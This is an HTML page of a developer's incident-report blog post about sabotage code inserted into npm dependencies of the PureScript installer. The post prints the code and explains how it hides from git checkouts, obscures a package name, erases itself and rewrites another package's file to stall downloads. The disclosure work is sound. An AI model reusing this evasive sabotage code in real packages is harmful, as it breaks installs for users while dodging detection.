@@ -1,0 +1,443 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>Malicious code in the PureScript npm installer - Harry Garrood</title>
+        <meta name="author" content="Harry Garrood">
+        <meta name="keywords" content="Harry Garrood personal me blog portfolio">
+        <meta name="description" content="I’m a software engineer based in Edinburgh, Scotland. My interests include getting computers to behave, helping other people get computers to behave, open source, maths, and music.">
+
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="alternate" type="application/atom+xml" title="Harry Garrood’s blog" href="/atom.xml">
+
+				<link rel="preconnect" href="https://fonts.gstatic.com">
+				<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700&family=Source+Serif+Pro:ital,wght@0,400;0,600;1,400;1,600&display=swap" rel="stylesheet">
+        <link href="/assets/css/normalize.css" rel="stylesheet" type="text/css">
+        <link href="/assets/css/styles.css" rel="stylesheet" type="text/css">
+
+        
+
+        
+    </head>
+    <body>
+				<div class="sidebar">
+          <div class="sidebar-content">
+            <h2><a href="/">Harry Garrood</a></h2>
+            <div class="about">
+              <p>
+  I'm a software engineer based in Edinburgh, Scotland. My interests
+  include helping people program computers more effectively, open
+  source, maths, and music.
+</p>
+<p>You can get hold of me via:</p>
+<dl>
+  <dt>Email</dt>
+  <dd>
+    <a rel="me" href="mailto:harry@garrood.me">harry@garrood.me</a>
+  </dd>
+
+  <dt>Mastodon</dt>
+  <dd>
+    <a rel="me" href="https://hachyderm.io/@hdgarrood">@hdgarrood&ZeroWidthSpace;@hachyderm.io</a>
+  </dd>
+
+  <dt>GitHub</dt>
+  <dd>
+    <a rel="me" href="https://github.com/hdgarrood">@hdgarrood</a>
+  </dd>
+</dl>
+
+            </div>
+            <ul class="horizontal-menu">
+              <li><a href="/">Blog</a></li>
+              <li class="about"><a href="/about">About</a></li>
+              <li><a href="/projects">Projects</a></li>
+              <li><a href="/talks">Talks</a></li>
+            </ul>
+          </div>
+        </div>
+        <main role="main">
+            <article>
+  <header>
+    <h1>Malicious code in the PureScript npm installer</h1>
+    <p class="byline">
+      <time datetime="2019-07-12T00:00:00+00:00">12 Jul 2019</time>
+    </p>
+  </header>
+
+  <p>Earlier this week, I found and addressed some malicious code in the purescript
+npm installer. The malicious code was inserted into dependencies of the
+installer: specifically, packages maintained by <a href="https://github.com/shinnn">@shinnn</a>, the original
+author of the purescript npm installer, and also the maintainer (until around a
+month ago).</p>
+
+<p>There’s some important background context I should explain first: after a few
+too many disagreements and unpleasant conversations with <a href="https://github.com/shinnn">@shinnn</a> about the
+maintenance of the purescript npm installer, we (the compiler maintainers)
+recently decided that it would be better if we maintained it ourselves, and
+asked him if he would transfer the <code class="language-plaintext highlighter-rouge">purescript</code> package on npm to us. He
+begrudgingly did so. The 0.13.2 PureScript compiler release, which we cut last
+week, is the first release of the compiler since we took over the <code class="language-plaintext highlighter-rouge">purescript</code>
+npm package.</p>
+
+<h2 id="quick-summary">Quick summary</h2>
+
+<ul>
+  <li>Malicious code was added to various dependencies of the purescript npm
+installer</li>
+  <li><a href="https://github.com/shinnn">@shinnn</a> claims that the malicious code was published by an attacker who
+gained access to his npm account</li>
+  <li>As far as we are aware, the only purpose of the malicious code was to
+sabotage the purescript npm installer to prevent it from running successfully</li>
+  <li>In the latest version of the purescript npm installer, the malicious code has
+now been removed, and all dependencies of <a href="https://github.com/shinnn">@shinnn</a>’s have been dropped</li>
+  <li>If you want to be absolutely sure you do not have malicious code on your
+machine, you should delete your <code class="language-plaintext highlighter-rouge">node_modules</code> directories and your
+<code class="language-plaintext highlighter-rouge">package-lock.json</code> files, and set a lower bound of <code class="language-plaintext highlighter-rouge">0.13.2</code> on the
+<code class="language-plaintext highlighter-rouge">purescript</code> package</li>
+  <li><del>We are in ongoing discussion with npm support in order to ascertain what
+else we can do to mitigate the issue</del></li>
+</ul>
+
+<p><strong>update:</strong> npm have responded:</p>
+
+<blockquote>
+  <p>The maintainer of rate-map and load-from-cwd-or-npm has replied and informed
+us that they had not published the packages and feared that their account had
+been compromised.</p>
+
+  <p>We have removed rate-map@1.0.3 and load-from-cwd-or-npm@3.0.2 from the
+registry.</p>
+
+  <p>The maintainer also published install-purescript-cli@0.5.1, whose
+dependencies are pinned to load-from-cwd-or-npm@3.0.1 and rate-map@1.0.2.
+This was done to prevent purescript v0.12.x from installing malicious
+versions of load-from-cwd-or-npm and rate-map.</p>
+</blockquote>
+
+<h2 id="where-did-the-malicious-code-come-from">Where did the malicious code come from?</h2>
+
+<p>The code was inserted first into the npm package <a href="https://npmjs.com/package/load-from-cwd-or-npm"><code class="language-plaintext highlighter-rouge">load-from-cwd-or-npm</code></a> at
+version 3.0.2, and later into the npm package <a href="https://npmjs.com/package/rate-map"><code class="language-plaintext highlighter-rouge">rate-map</code></a> starting at
+version 1.0.3.  A number of versions of both of these packages were published
+over the last few days, and many of them have now been unpublished. <del>As far as
+I can tell the only remaining version of <code class="language-plaintext highlighter-rouge">load-from-cwd-or-npm</code> including any
+malicious code is 3.0.2, and the only remaining version of <code class="language-plaintext highlighter-rouge">rate-map</code> including
+any malicious code is version 1.0.3.</del></p>
+
+<p><strong>update:</strong> npm have now removed both <code class="language-plaintext highlighter-rouge">load-from-cwd-or-npm@3.0.2</code> and
+<code class="language-plaintext highlighter-rouge">rate-map@1.0.3</code> from the registry.</p>
+
+<h2 id="what-did-it-do">What did it do?</h2>
+
+<p>In short, the code sabotages the purescript npm installer to prevent the
+download from completing, making the installer hang during the “Check if a
+prebuilt binary is provided for your platform” step. The first exploit did this
+by breaking the <code class="language-plaintext highlighter-rouge">load-from-cwd-or-npm</code> package so that any call to
+<code class="language-plaintext highlighter-rouge">loadFromCwdOrNpm()</code> would return a <code class="language-plaintext highlighter-rouge">PassThrough</code> stream instead of the package
+we were expecting (in this case, the <code class="language-plaintext highlighter-rouge">request</code> package, which we were using for
+downloading compiler binaries). The second iteration of the exploit did this by
+modifying a source file to prevent a download callback from firing. I’ve gone
+into more detail at the bottom of the post.</p>
+
+<h2 id="timeline">Timeline</h2>
+
+<p>This is my current understanding of what happened:</p>
+
+<ul>
+  <li>
+    <p>5 July, around 1300 UTC: PureScript 0.13.2 released, including version 0.13.2
+of the npm package <code class="language-plaintext highlighter-rouge">purescript</code>.</p>
+
+    <p>At this point, multiple compiler maintainers were able to successfully
+install the compiler using the npm installer.</p>
+  </li>
+  <li>
+    <p>5 July, around 2100 UTC: <code class="language-plaintext highlighter-rouge">load-from-cwd-or-npm@3.0.2</code> is published, with an
+exploit breaking the purescript npm installer</p>
+
+    <p>As far as I am aware, this is the first published version of any of
+<a href="https://github.com/shinnn">@shinnn</a>’s packages which includes any malicious code. Now, any person
+trying to install purescript will get the malicious code.</p>
+
+    <p>We soon start receiving bug reports such as <a href="https://github.com/purescript/npm-installer/issues/12">purescript/npm-installer#12</a>.
+We recommend that people use an alternative installation method while we
+figure out what’s going on.</p>
+
+    <p>The compiler maintainers investigate, and for a while, we are stumped. It’s
+difficult to reliably reproduce, as the failure doesn’t occur in a local
+checkout of the purescript npm installer.</p>
+  </li>
+  <li>
+    <p>9 July, around 0100 UTC: <a href="https://github.com/doolse">@doolse</a> identifies that
+<code class="language-plaintext highlighter-rouge">load-from-cwd-or-npm@3.0.2</code> is the cause.</p>
+
+    <p>See <a href="https://github.com/purescript/npm-installer/issues/12#issuecomment-509455840">purescript/npm-installer#12 (comment)</a></p>
+
+    <p><a href="https://github.com/doolse">@doolse</a> opens an issue on the <code class="language-plaintext highlighter-rouge">load-from-cwd-or-npm</code> repo pointing out
+that the package is breaking the purescript npm installer (although at this
+stage, none of us spot that the code is malicious). This issue is later
+deleted by <a href="https://github.com/shinnn">@shinnn</a>.</p>
+  </li>
+  <li>
+    <p>9 July, around 0500 UTC: <code class="language-plaintext highlighter-rouge">load-from-cwd-or-npm@3.0.4</code> is published, which no
+longer includes the exploit.</p>
+  </li>
+  <li>
+    <p>9 July, around 0800 UTC: <code class="language-plaintext highlighter-rouge">rate-map@1.0.3</code> is published, which includes a more
+advanced version of the exploit, now with extra code which removes any trace
+of itself after it has run.</p>
+  </li>
+  <li>
+    <p>9 July, around 1100 UTC: Still not suspecting any bad faith, and thinking the
+<code class="language-plaintext highlighter-rouge">load-from-cwd-or-npm</code> issue was a genuine bug, I publish a new version of
+the purescript npm installer which vendors a modified version of <code class="language-plaintext highlighter-rouge">dl-tar</code>
+which does not use <code class="language-plaintext highlighter-rouge">load-from-cwd-or-npm</code>.</p>
+
+    <p>This fixes the issue for some people, presumably those who have an older
+<code class="language-plaintext highlighter-rouge">rate-map</code> pinned in their <code class="language-plaintext highlighter-rouge">package-lock.json</code> files. However, others are
+still able to reproduce the problem, because of the new version of the
+exploit which is now included in <code class="language-plaintext highlighter-rouge">rate-map</code>.</p>
+  </li>
+  <li>
+    <p>9 July, around 1130 UTC: I spot the malicious code in <code class="language-plaintext highlighter-rouge">rate-map</code>, and report
+it to npm support.</p>
+
+    <p>Now understanding that this is a deliberate act of bad faith, I start working
+on either vendoring or dropping all dependencies of the purescript npm
+installer which <a href="https://github.com/shinnn">@shinnn</a> maintains.</p>
+  </li>
+  <li>
+    <p>9 July, around 1400 UTC: I publish a new version of the purescript npm
+installer in which every dependency of <a href="https://github.com/shinnn">@shinnn</a>’s has been either dropped
+or vendored (and of course those which I vendored I also audited).</p>
+  </li>
+</ul>
+
+<h2 id="how-has-this-been-addressed">How has this been addressed?</h2>
+
+<p>In the <code class="language-plaintext highlighter-rouge">purescript-installer</code> package, we have dropped all dependencies which
+are maintained by <a href="https://github.com/shinnn">@shinnn</a> as of v0.2.5. We have also marked all earlier
+versions of <code class="language-plaintext highlighter-rouge">purescript-installer</code> as deprecated.</p>
+
+<p>If you install the <code class="language-plaintext highlighter-rouge">purescript</code> npm package at any version before 0.13.2, you
+will still be pulling in packages maintained by <a href="https://github.com/shinnn">@shinnn</a>. I’d suggest
+updating as soon as possible, or if you are still using 0.12.x, installing via
+some other means. We are currently in discussion with npm’s security team to
+discuss how best to resolve the issue of previous versions of the <code class="language-plaintext highlighter-rouge">purescript</code>
+package.</p>
+
+<h2 id="how-did-the-exploits-work">How did the exploits work?</h2>
+
+<p>I’ve archived <a href="https://gist.github.com/hdgarrood/358e98b5956e5f7f59c85c2e56534f2b">complete copies of the packages I’ve identified including the malicious code in a gist</a>.</p>
+
+<h3 id="exploit-version-1-load-from-cwd-or-npm">Exploit version 1: load-from-cwd-or-npm</h3>
+
+<p>The first version of the exploit, in <code class="language-plaintext highlighter-rouge">load-from-cwd-or-npm@3.0.2</code>, occurs in
+<a href="https://gist.github.com/hdgarrood/358e98b5956e5f7f59c85c2e56534f2b#file-load-from-cwd-or-npm-3-0-2-js-L50-L83">lines 50 to 83 of index.js</a>:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kd">const</span> <span class="nx">tasks</span> <span class="o">=</span> <span class="p">[</span><span class="nx">PassThrough</span><span class="p">];</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="nx">argLen</span> <span class="o">===</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">function</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">throw</span> <span class="k">new</span> <span class="nx">TypeError</span><span class="p">(</span><span class="s2">`Expected a function to compare two package versions, but got </span><span class="p">${</span>
+        <span class="nx">inspectWithKind</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+      <span class="p">}</span><span class="s2">.`</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">tasks</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">resolveSemverFromNpm</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="nx">tasks</span><span class="p">.</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">resolveFromNpm</span><span class="p">(</span><span class="nx">modulePkgId</span><span class="p">));</span>
+
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">results</span> <span class="o">=</span> <span class="k">await</span> <span class="nb">Promise</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span><span class="nx">tasks</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">parent</span> <span class="o">=</span> <span class="nx">module</span><span class="p">;</span>
+
+    <span class="k">do</span> <span class="p">{</span>
+      <span class="nx">parent</span> <span class="o">=</span> <span class="nx">parent</span><span class="p">.</span><span class="nx">parent</span><span class="p">;</span>
+
+      <span class="k">try</span> <span class="p">{</span>
+        <span class="kd">const</span> <span class="p">{</span><span class="nx">path</span><span class="p">}</span> <span class="o">=</span> <span class="nx">parent</span><span class="p">;</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">endsWith</span><span class="p">(</span><span class="dl">'</span><span class="s1">cli</span><span class="dl">'</span><span class="p">)</span> <span class="o">||</span> <span class="p">[</span><span class="nx">path</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="nx">path</span><span class="p">)].</span><span class="nx">some</span><span class="p">(</span><span class="nx">dir</span> <span class="o">=&gt;</span> <span class="nx">existsSync</span><span class="p">(</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">dir</span><span class="p">,</span> <span class="dl">'</span><span class="s1">.git</span><span class="dl">'</span><span class="p">))))</span> <span class="p">{</span>
+          <span class="nx">parent</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">npm</span><span class="dl">'</span><span class="p">;</span>
+          <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">_</span><span class="p">)</span> <span class="p">{}</span>
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nx">parent</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">parent</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">results</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>This code is a little obfuscated but it didn’t take too long for me to work out
+what it is doing.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">tasks</code> array initially contains just the <code class="language-plaintext highlighter-rouge">PassThrough</code> stream constructor.
+The code then calls <code class="language-plaintext highlighter-rouge">tasks.unshift</code> twice so that the <code class="language-plaintext highlighter-rouge">PassThrough</code> constructor
+is at index 2 in the <code class="language-plaintext highlighter-rouge">tasks</code> array. This will be important later.</p>
+
+<p>The first <code class="language-plaintext highlighter-rouge">do</code>-<code class="language-plaintext highlighter-rouge">while</code> loop works its way up the <code class="language-plaintext highlighter-rouge">require</code> chain to try to find
+out how the code is being run, by recursively inspecting the <code class="language-plaintext highlighter-rouge">parent</code> property
+of each module in the chain. Then, we have this condition:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span>
+      <span class="nx">path</span><span class="p">.</span><span class="nx">endsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">cli</span><span class="dl">"</span><span class="p">)</span> <span class="o">||</span>
+      <span class="p">[</span><span class="nx">path</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="nx">path</span><span class="p">)].</span><span class="nx">some</span><span class="p">(</span><span class="nx">dir</span> <span class="o">=&gt;</span> <span class="nx">existsSync</span><span class="p">(</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">dir</span><span class="p">,</span> <span class="dl">"</span><span class="s2">.git</span><span class="dl">"</span><span class="p">)))</span>
+    <span class="p">)</span>
+</code></pre></div></div>
+
+<p>The purpose of this condition appears to be to decide whether or not to
+activate the malicious code. As far as I can tell, the <code class="language-plaintext highlighter-rouge">path.endsWith("cli")</code>
+condition is designed to evaluate to <code class="language-plaintext highlighter-rouge">true</code> on older versions of the purescript
+npm installer; before we took over, the <code class="language-plaintext highlighter-rouge">purescript</code> npm package depended on
+the <code class="language-plaintext highlighter-rouge">install-purescript-cli</code> package, which is maintained by <a href="https://github.com/shinnn">@shinnn</a>; in
+the most recent version of <code class="language-plaintext highlighter-rouge">purescript</code>, this dependency has been replaced with
+the <code class="language-plaintext highlighter-rouge">purescript-installer</code> package, which we maintain. So the purpose of this
+condition seems to be to ensure that the malicious code only runs when our
+installer is being used (and not <a href="https://github.com/shinnn">@shinnn</a>’s).</p>
+
+<p>The second condition is checking whether there is a <code class="language-plaintext highlighter-rouge">.git</code> directory alongside
+the file. The purpose of this is presumably to avoid activating the malicious
+code when the installer is being run out of a git working directory, to make it
+harder to reproduce and track down.</p>
+
+<p>The purpose of the <code class="language-plaintext highlighter-rouge">parent</code> variable at this stage is just to indicate whether
+the malicious code should run or not: if the exploit should be run, then
+<code class="language-plaintext highlighter-rouge">parent</code> will be <code class="language-plaintext highlighter-rouge">undefined</code>, but if it shouldn’t, then it will be set to the
+string <code class="language-plaintext highlighter-rouge">"npm"</code>. We then have this if statement:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">parent</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">string</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="nx">results</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>which just returns the <code class="language-plaintext highlighter-rouge">PassThrough</code> constructor in the case where the
+malicious code is being run; note that there are no other references to
+<code class="language-plaintext highlighter-rouge">results[2]</code> in the source file.</p>
+
+<p>The effect of this is that when we do <code class="language-plaintext highlighter-rouge">loadFromCwdOrNpm("request")</code>, we get the
+<code class="language-plaintext highlighter-rouge">PassThrough</code> constructor. So when we have code along the lines of</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">request</span> <span class="o">=</span> <span class="nx">loadFromCwdOrNpm</span><span class="p">(</span><span class="dl">"</span><span class="s2">request</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">request</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://github.com/.../archive.tar.gz</span><span class="dl">"</span><span class="p">).</span><span class="nx">pipe</span><span class="p">(...);</span>
+</code></pre></div></div>
+
+<p>nothing happens; no HTTP request is performed.</p>
+
+<h3 id="exploit-version-2-rate-map">Exploit version 2: rate-map</h3>
+
+<p><code class="language-plaintext highlighter-rouge">rate-map@1.0.3</code> includes the same <code class="language-plaintext highlighter-rouge">do</code>-<code class="language-plaintext highlighter-rouge">while</code> loop to control whether or not
+the exploit runs, although it also includes some interesting modifications.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">let</span> <span class="nx">parent</span> <span class="o">=</span> <span class="nx">module</span><span class="p">;</span>
+<span class="kd">const</span> <span class="p">{</span>
+  <span class="na">existsSync</span><span class="p">:</span> <span class="nx">existsSync</span><span class="p">,</span>
+  <span class="na">readFileSync</span><span class="p">:</span> <span class="nx">readFileSync</span><span class="p">,</span>
+  <span class="na">writeFileSync</span><span class="p">:</span> <span class="nx">writeFileSync</span>
+<span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">fs</span><span class="dl">"</span><span class="p">);</span>
+<span class="k">do</span> <span class="p">{</span>
+  <span class="nx">parent</span> <span class="o">=</span> <span class="nx">parent</span><span class="p">.</span><span class="nx">parent</span><span class="p">;</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="p">{</span> <span class="na">path</span><span class="p">:</span> <span class="nx">path</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">parent</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span>
+      <span class="nx">path</span><span class="p">.</span><span class="nx">endsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">cli</span><span class="dl">"</span><span class="p">)</span> <span class="o">||</span>
+      <span class="p">[</span><span class="nx">path</span><span class="p">,</span> <span class="nx">dirname</span><span class="p">(</span><span class="nx">path</span><span class="p">)].</span><span class="nx">some</span><span class="p">(</span><span class="nx">dir</span> <span class="o">=&gt;</span> <span class="nx">existsSync</span><span class="p">(</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">dir</span><span class="p">,</span> <span class="dl">"</span><span class="s2">.git</span><span class="dl">"</span><span class="p">)))</span>
+    <span class="p">)</span> <span class="p">{</span>
+      <span class="nx">parent</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">npm</span><span class="dl">"</span><span class="p">;</span>
+      <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">_</span><span class="p">)</span> <span class="p">{}</span>
+<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nx">parent</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">parent</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">const</span> <span class="nx">px</span> <span class="o">=</span> <span class="nx">require</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span>
+    <span class="nx">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">([</span><span class="mi">100</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">114</span><span class="p">]).</span><span class="nx">toString</span><span class="p">()</span>
+  <span class="p">);</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="nx">writeFileSync</span><span class="p">(</span>
+      <span class="nx">__filename</span><span class="p">,</span>
+      <span class="nx">readFileSync</span><span class="p">(</span><span class="nx">__filename</span><span class="p">,</span> <span class="dl">"</span><span class="s2">utf8</span><span class="dl">"</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span>
+        <span class="sr">/let parent</span><span class="se">[^\0]</span><span class="sr">*module</span><span class="se">\.</span><span class="sr">exports/u</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">module.exports</span><span class="dl">"</span>
+      <span class="p">)</span>
+    <span class="p">);</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">_</span><span class="p">)</span> <span class="p">{}</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="nx">writeFileSync</span><span class="p">(</span>
+      <span class="nx">px</span><span class="p">,</span>
+      <span class="nx">readFileSync</span><span class="p">(</span><span class="nx">px</span><span class="p">,</span> <span class="dl">"</span><span class="s2">utf8</span><span class="dl">"</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\n\s</span><span class="sr">*cb</span><span class="se">\(</span><span class="sr">null, chunk</span><span class="se">\)</span><span class="sr">;/u</span><span class="p">,</span> <span class="dl">""</span><span class="p">)</span>
+    <span class="p">);</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">_</span><span class="p">)</span> <span class="p">{}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>After the <code class="language-plaintext highlighter-rouge">do</code>-<code class="language-plaintext highlighter-rouge">while</code> loop, in the case where the exploit code is going to
+run, it first resolves the path of the <code class="language-plaintext highlighter-rouge">dl-tar</code> package on the local
+filesystem; note the use of <code class="language-plaintext highlighter-rouge">Buffer.from</code> to obscure this:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nx">Buffer</span><span class="p">.</span><span class="k">from</span><span class="p">([</span><span class="mi">100</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">114</span><span class="p">]).</span><span class="nx">toString</span><span class="p">()</span>
+<span class="dl">'</span><span class="s1">dl-tar</span><span class="dl">'</span>
+</code></pre></div></div>
+
+<p>The file path of <code class="language-plaintext highlighter-rouge">index.js</code> from the <code class="language-plaintext highlighter-rouge">dl-tar</code> package will now be stored in the
+<code class="language-plaintext highlighter-rouge">px</code> variable. Then, we have this:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">try</span> <span class="p">{</span>
+    <span class="nx">writeFileSync</span><span class="p">(</span>
+      <span class="nx">__filename</span><span class="p">,</span>
+      <span class="nx">readFileSync</span><span class="p">(</span><span class="nx">__filename</span><span class="p">,</span> <span class="dl">"</span><span class="s2">utf8</span><span class="dl">"</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span>
+        <span class="sr">/let parent</span><span class="se">[^\0]</span><span class="sr">*module</span><span class="se">\.</span><span class="sr">exports/u</span><span class="p">,</span>
+        <span class="dl">"</span><span class="s2">module.exports</span><span class="dl">"</span>
+      <span class="p">)</span>
+    <span class="p">);</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">_</span><span class="p">)</span> <span class="p">{}</span>
+</code></pre></div></div>
+
+<p>which rewrites the current file to remove the malicious code, presumably also
+in order to make this exploit harder to track down. Finally, we have this:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">try</span> <span class="p">{</span>
+    <span class="nx">writeFileSync</span><span class="p">(</span>
+      <span class="nx">px</span><span class="p">,</span>
+      <span class="nx">readFileSync</span><span class="p">(</span><span class="nx">px</span><span class="p">,</span> <span class="dl">"</span><span class="s2">utf8</span><span class="dl">"</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\n\s</span><span class="sr">*cb</span><span class="se">\(</span><span class="sr">null, chunk</span><span class="se">\)</span><span class="sr">;/u</span><span class="p">,</span> <span class="dl">""</span><span class="p">)</span>
+    <span class="p">);</span>
+  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">_</span><span class="p">)</span> <span class="p">{}</span>
+</code></pre></div></div>
+
+<p>which replaces any lines in <code class="language-plaintext highlighter-rouge">dl-tar</code>’s <code class="language-plaintext highlighter-rouge">index.js</code> file which match the regular
+expression <code class="language-plaintext highlighter-rouge">/\n\s*cb\(null, chunk\);/</code> with empty strings. When running this
+code against <code class="language-plaintext highlighter-rouge">dl-tar@0.8.0</code>, the latest version at the time of writing, it
+produces the following diff:</p>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gd">--- a/home/harry/code/purescript-npm-installer/dl-tar/index.js
+</span><span class="gi">+++ b/node_modules/purescript-installer/dl-tar/index.js
+</span><span class="p">@@ -205,6 +205,7 @@</span> module.exports = function dlTar(...args) {
+   new Transform({
+     transform(chunk, encoding, cb) {
+       unpackStream.responseBytes += chunk.length;
+<span class="gd">-      cb(null, chunk);
+</span>     }
+   }),
+   unpackStream
+</code></pre></div></div>
+
+<p>that is, it removes the call to <code class="language-plaintext highlighter-rouge">cb</code>, which means that the subscribers to
+<code class="language-plaintext highlighter-rouge">dlTar</code> won’t fire.</p>
+
+
+
+  <hr class="end-of-post">
+<p class="post-footer">
+I don't host comments on my blog, but if you have thoughts or questions, you
+can let me know on Mastodon:
+<a href="https://hachyderm.io/@hdgarrood">@hdgarrood​@hachyderm.io</a>
+</p>
+
+</article>
+
+        </main>
+    </body>
+</html>
